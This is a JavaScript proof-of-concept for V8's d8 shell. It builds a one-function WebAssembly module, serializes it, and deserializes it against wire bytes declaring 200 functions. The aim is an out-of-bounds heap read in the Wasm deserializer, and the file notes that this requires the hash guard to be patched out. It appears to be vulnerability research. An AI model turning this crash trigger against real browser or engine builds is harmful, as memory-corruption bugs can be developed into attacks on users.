'use strict';
// ReadCode OOB PoC: wasm-serialization.cc NativeModuleDeserializer::ReadCode
// Prerequisite: d8 binary with hash guard patched (see patch_d8.py)
// Run: ./d8_poc --no-liftoff --no-wasm-lazy-compilation poc_nogdb.js

// 1-function Wasm module: (func (result i32) i32.const 42)
const wire1fn = new Uint8Array([
  0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,
  0x01,0x05,0x01,0x60,0x00,0x01,0x7f,
  0x03,0x02,0x01,0x00,
  0x07,0x08,0x01,0x04,0x6d,0x61,0x69,0x6e,0x00,0x00,
  0x0a,0x06,0x01,0x04,0x00,0x41,0x2a,0x0b
]);

// Build wire bytes declaring 200 functions
function buildWire200() {
  function leb128(n) {
    const r=[];
    do { let b=n&0x7f; n>>>=7; r.push(n?b|0x80:b); } while(n);
    return r;
  }
  const N=200;
  const typeSec=[0x01,0x05,0x01,0x60,0x00,0x01,0x7f];
  const fnIdxs=new Array(N).fill(0x00);
  const fnPayload=[...leb128(N),...fnIdxs];
  const funcSec=[0x03,...leb128(fnPayload.length),...fnPayload];
  const body=[0x04,0x00,0x41,0x00,0x0b];
  const codeBodies=[];
  for(let i=0;i<N;i++) codeBodies.push(...body);
  const codePayload=[...leb128(N),...codeBodies];
  const codeSec=[0x0a,...leb128(codePayload.length),...codePayload];
  return new Uint8Array([0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,
                         ...typeSec,...funcSec,...codeSec]);
}

const wire200=buildWire200();
print(`[*] wire1fn: ${wire1fn.length}B  wire200: ${wire200.length}B`);

const mod1=new WebAssembly.Module(wire1fn);
const blob1fn=d8.wasm.serializeModule(mod1);
print(`[*] blob1fn: ${blob1fn.byteLength}B  — expected crash on next line`);

// DeserializeNativeModule loops num_functions()=200 times,
// reads past blob end after function 0 → OOB heap read →
// TranslateEffectHandlersToCanonical → SIGSEGV
d8.wasm.deserializeModule(blob1fn, wire200);
print('[!] No crash — hash guard still active');
